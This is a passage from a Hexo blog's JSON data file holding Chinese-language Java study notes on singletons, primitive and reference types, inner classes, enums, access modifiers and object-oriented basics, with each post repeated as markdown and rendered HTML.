}\n}\n\n```\n","slug":"java/java单例","published":1,"updated":"2019-01-21T09:06:32.882Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051n000v6cvprps6yxkg","content":"<h4 id=\"1-用途\"><a href=\"#1-用途\" class=\"headerlink\" title=\"1.用途\"></a>1.用途</h4><p>用来维护一个全局的类，保存某些常用数据，减少资源消耗。</p>\n<h4 id=\"2-原理\"><a href=\"#2-原理\" class=\"headerlink\" title=\"2.原理\"></a>2.原理</h4><p>维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。</p>\n<h4 id=\"3-两种常用实现\"><a href=\"#3-两种常用实现\" class=\"headerlink\" title=\"3.两种常用实现\"></a>3.两种常用实现</h4><p>1.饿汉式<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //这句饿汉式的关键，类加载时初始化</span><br><span class=\"line\">    private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.静态内部类<br>可用调用时再初始化加载(lazyLoad)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //静态内部类</span><br><span class=\"line\">    private static class SingletonHolder&#123;</span><br><span class=\"line\">        private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return SingletonHolder.instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-用途\"><a href=\"#1-用途\" class=\"headerlink\" title=\"1.用途\"></a>1.用途</h4><p>用来维护一个全局的类，保存某些常用数据，减少资源消耗。</p>\n<h4 id=\"2-原理\"><a href=\"#2-原理\" class=\"headerlink\" title=\"2.原理\"></a>2.原理</h4><p>维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。</p>\n<h4 id=\"3-两种常用实现\"><a href=\"#3-两种常用实现\" class=\"headerlink\" title=\"3.两种常用实现\"></a>3.两种常用实现</h4><p>1.饿汉式<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //这句饿汉式的关键，类加载时初始化</span><br><span class=\"line\">    private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.静态内部类<br>可用调用时再初始化加载(lazyLoad)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //静态内部类</span><br><span class=\"line\">    private static class SingletonHolder&#123;</span><br><span class=\"line\">        private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return SingletonHolder.instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"OJT021","date":"2018-09-21T08:23:45.000Z","_content":"#### 1.基本类型\n- short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。\n- int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。\n- long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。\n- float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。\n- double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。\n- boolean：只有true和false两个取值。\n- char：16位，存储Unicode码，用单引号赋值。\n\n基本类型并不是类对象。<br>\n为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.\n对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character\n现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.\njava提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。\n\n#### 2.引用类型\n- 强引用<br>\n最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br>\n其它三个暂时不太理解，以后接触再添加\n- 软引用\n- 弱引用\n- 虚引用\n\n#### 3.基本类型与引用类型区别\n基本类型就是一个值<br>\n引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br>\n<!-- more -->\n#### 4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\n- 引用(reference) :\n指向一个对象<br>\n- 实例(instance):\n按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词\n\n- 内部类<br>\n将一个类定义在另一个类的内部。\n内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br>\n使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br>\n原文连接：https://blog.csdn.net/qq_38242407/article/details/78159494\n\n父类：\n```\npublic class Father {\n\tpublic int strong(){\n\t\treturn 9;\n\t}\n}\npublic class Mother {\n\tpublic int kind(){\n\t\treturn 8;\n\t}\n}\n```\n\n子类，内部类多重继承\n```\npublic class Son {\n  //内部类继承Father类\n\tclass Father_1 extends Father{  //继承一\n\t\tpublic int strong(){\n\t\t\treturn super.strong() + 1;\n\t\t}\n\t}\n\tclass Mother_1 extends  Mother{  //继承二\n\t\tpublic int kind(){\n\t\t\treturn super.kind() - 2;\n\t\t}\n\t}\n   //获取父类1方法\n\tpublic int getStrong(){\n\t\treturn new Father_1().strong();\n\t}\n   //获取父类2方法\n\tpublic int getKind(){\n\t\treturn new Mother_1().kind();\n\t}\n}\n```\n\n- 枚举类<br>\n在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br>\n枚举类最基本的用法是实现一个类型安全的枚举（final)。\n枚举常量用逗号分隔,每个枚举常量都是一个对象。\n每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。\n\n- 访问控制符<br>\npublic\t共有的，对所有类可见。<br>\nprotected\t受保护的，对同一包内的类和所有子类可见。<br>\nprivate\t私有的，在同一类内可见。<br>\n默认的\t在同一包内可见。默认不使用任何修饰符。<br>\n","source":"_posts/java/java基本类型.md","raw":"---\ntitle: OJT021\ndate: 2018-09-21 16:23:45\ntags: [java]\n---\n#### 1.基本类型\n- short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。\n- int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。\n- long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。\n- float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。\n- double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。\n- boolean：只有true和false两个取值。\n- char：16位，存储Unicode码，用单引号赋值。\n\n基本类型并不是类对象。<br>\n为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.\n对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character\n现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.\njava提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。\n\n#### 2.引用类型\n- 强引用<br>\n最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br>\n其它三个暂时不太理解，以后接触再添加\n- 软引用\n- 弱引用\n- 虚引用\n\n#### 3.基本类型与引用类型区别\n基本类型就是一个值<br>\n引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br>\n<!-- more -->\n#### 4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\n- 引用(reference) :\n指向一个对象<br>\n- 实例(instance):\n按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词\n\n- 内部类<br>\n将一个类定义在另一个类的内部。\n内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br>\n使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br>\n原文连接：https://blog.csdn.net/qq_38242407/article/details/78159494\n\n父类：\n```\npublic class Father {\n\tpublic int strong(){\n\t\treturn 9;\n\t}\n}\npublic class Mother {\n\tpublic int kind(){\n\t\treturn 8;\n\t}\n}\n```\n\n子类，内部类多重继承\n```\npublic class Son {\n  //内部类继承Father类\n\tclass Father_1 extends Father{  //继承一\n\t\tpublic int strong(){\n\t\t\treturn super.strong() + 1;\n\t\t}\n\t}\n\tclass Mother_1 extends  Mother{  //继承二\n\t\tpublic int kind(){\n\t\t\treturn super.kind() - 2;\n\t\t}\n\t}\n   //获取父类1方法\n\tpublic int getStrong(){\n\t\treturn new Father_1().strong();\n\t}\n   //获取父类2方法\n\tpublic int getKind(){\n\t\treturn new Mother_1().kind();\n\t}\n}\n```\n\n- 枚举类<br>\n在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br>\n枚举类最基本的用法是实现一个类型安全的枚举（final)。\n枚举常量用逗号分隔,每个枚举常量都是一个对象。\n每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。\n\n- 访问控制符<br>\npublic\t共有的，对所有类可见。<br>\nprotected\t受保护的，对同一包内的类和所有子类可见。<br>\nprivate\t私有的，在同一类内可见。<br>\n默认的\t在同一包内可见。默认不使用任何修饰符。<br>\n","slug":"java/java基本类型","published":1,"updated":"2019-01-21T09:08:29.090Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051o000x6cvpu0o76r0m","content":"<h4 id=\"1-基本类型\"><a href=\"#1-基本类型\" class=\"headerlink\" title=\"1.基本类型\"></a>1.基本类型</h4><ul>\n<li>short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。</li>\n<li>int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。</li>\n<li>long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。</li>\n<li>float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。</li>\n<li>double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。</li>\n<li>boolean：只有true和false两个取值。</li>\n<li>char：16位，存储Unicode码，用单引号赋值。</li>\n</ul>\n<p>基本类型并不是类对象。<br><br>为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.<br>对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character<br>现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.<br>java提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。</p>\n<h4 id=\"2-引用类型\"><a href=\"#2-引用类型\" class=\"headerlink\" title=\"2.引用类型\"></a>2.引用类型</h4><ul>\n<li>强引用<br><br>最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br><br>其它三个暂时不太理解，以后接触再添加</li>\n<li>软引用</li>\n<li>弱引用</li>\n<li>虚引用</li>\n</ul>\n<h4 id=\"3-基本类型与引用类型区别\"><a href=\"#3-基本类型与引用类型区别\" class=\"headerlink\" title=\"3.基本类型与引用类型区别\"></a>3.基本类型与引用类型区别</h4><p>基本类型就是一个值<br><br>引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br><br><a id=\"more\"></a></p>\n<h4 id=\"4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"><a href=\"#4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\" class=\"headerlink\" title=\"4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"></a>4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法</h4><ul>\n<li>引用(reference) :<br>指向一个对象<br></li>\n<li><p>实例(instance):<br>按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词</p>\n</li>\n<li><p>内部类<br><br>将一个类定义在另一个类的内部。<br>内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br><br>使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br><br>原文连接：<a href=\"https://blog.csdn.net/qq_38242407/article/details/78159494\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_38242407/article/details/78159494</a></p>\n</li>\n</ul>\n<p>父类：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Father &#123;</span><br><span class=\"line\">\tpublic int strong()&#123;</span><br><span class=\"line\">\t\treturn 9;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public class Mother &#123;</span><br><span class=\"line\">\tpublic int kind()&#123;</span><br><span class=\"line\">\t\treturn 8;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>子类，内部类多重继承<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Son &#123;</span><br><span class=\"line\">  //内部类继承Father类</span><br><span class=\"line\">\tclass Father_1 extends Father&#123;  //继承一</span><br><span class=\"line\">\t\tpublic int strong()&#123;</span><br><span class=\"line\">\t\t\treturn super.strong() + 1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclass Mother_1 extends  Mother&#123;  //继承二</span><br><span class=\"line\">\t\tpublic int kind()&#123;</span><br><span class=\"line\">\t\t\treturn super.kind() - 2;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类1方法</span><br><span class=\"line\">\tpublic int getStrong()&#123;</span><br><span class=\"line\">\t\treturn new Father_1().strong();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类2方法</span><br><span class=\"line\">\tpublic int getKind()&#123;</span><br><span class=\"line\">\t\treturn new Mother_1().kind();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><p>枚举类<br><br>在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br><br>枚举类最基本的用法是实现一个类型安全的枚举（final)。<br>枚举常量用逗号分隔,每个枚举常量都是一个对象。<br>每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。</p>\n</li>\n<li><p>访问控制符<br><br>public    共有的，对所有类可见。<br><br>protected    受保护的，对同一包内的类和所有子类可见。<br><br>private    私有的，在同一类内可见。<br><br>默认的    在同一包内可见。默认不使用任何修饰符。<br></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"1-基本类型\"><a href=\"#1-基本类型\" class=\"headerlink\" title=\"1.基本类型\"></a>1.基本类型</h4><ul>\n<li>short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。</li>\n<li>int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。</li>\n<li>long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。</li>\n<li>float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。</li>\n<li>double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。</li>\n<li>boolean：只有true和false两个取值。</li>\n<li>char：16位，存储Unicode码，用单引号赋值。</li>\n</ul>\n<p>基本类型并不是类对象。<br><br>为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.<br>对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character<br>现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.<br>java提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。</p>\n<h4 id=\"2-引用类型\"><a href=\"#2-引用类型\" class=\"headerlink\" title=\"2.引用类型\"></a>2.引用类型</h4><ul>\n<li>强引用<br><br>最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br><br>其它三个暂时不太理解，以后接触再添加</li>\n<li>软引用</li>\n<li>弱引用</li>\n<li>虚引用</li>\n</ul>\n<h4 id=\"3-基本类型与引用类型区别\"><a href=\"#3-基本类型与引用类型区别\" class=\"headerlink\" title=\"3.基本类型与引用类型区别\"></a>3.基本类型与引用类型区别</h4><p>基本类型就是一个值<br><br>引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br><br>","more":"</p>\n<h4 id=\"4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"><a href=\"#4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\" class=\"headerlink\" title=\"4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"></a>4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法</h4><ul>\n<li>引用(reference) :<br>指向一个对象<br></li>\n<li><p>实例(instance):<br>按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词</p>\n</li>\n<li><p>内部类<br><br>将一个类定义在另一个类的内部。<br>内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br><br>使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br><br>原文连接：<a href=\"https://blog.csdn.net/qq_38242407/article/details/78159494\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_38242407/article/details/78159494</a></p>\n</li>\n</ul>\n<p>父类：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Father &#123;</span><br><span class=\"line\">\tpublic int strong()&#123;</span><br><span class=\"line\">\t\treturn 9;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public class Mother &#123;</span><br><span class=\"line\">\tpublic int kind()&#123;</span><br><span class=\"line\">\t\treturn 8;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>子类，内部类多重继承<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Son &#123;</span><br><span class=\"line\">  //内部类继承Father类</span><br><span class=\"line\">\tclass Father_1 extends Father&#123;  //继承一</span><br><span class=\"line\">\t\tpublic int strong()&#123;</span><br><span class=\"line\">\t\t\treturn super.strong() + 1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclass Mother_1 extends  Mother&#123;  //继承二</span><br><span class=\"line\">\t\tpublic int kind()&#123;</span><br><span class=\"line\">\t\t\treturn super.kind() - 2;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类1方法</span><br><span class=\"line\">\tpublic int getStrong()&#123;</span><br><span class=\"line\">\t\treturn new Father_1().strong();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类2方法</span><br><span class=\"line\">\tpublic int getKind()&#123;</span><br><span class=\"line\">\t\treturn new Mother_1().kind();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><p>枚举类<br><br>在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br><br>枚举类最基本的用法是实现一个类型安全的枚举（final)。<br>枚举常量用逗号分隔,每个枚举常量都是一个对象。<br>每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。</p>\n</li>\n<li><p>访问控制符<br><br>public    共有的，对所有类可见。<br><br>protected    受保护的，对同一包内的类和所有子类可见。<br><br>private    私有的，在同一类内可见。<br><br>默认的    在同一包内可见。默认不使用任何修饰符。<br></p>\n</li>\n</ul>"},{"title":"OJT012","date":"2018-09-21T08:09:38.000Z","_content":"\n#### 1.java面向对象\n###### 面向对象（Object Oriented）<br>\n其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.\n从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式\n\n###### 对象<br>\n对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br>\n类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。\n当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，\n把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。\n\n###### 类<br>\n类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。\n在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br>\n\n>变量<br>\nstatic: 静态变量/静态方法(类变量/类方法，类层面上)<br>\nfinal: 常量(全局层面上)\n\n> 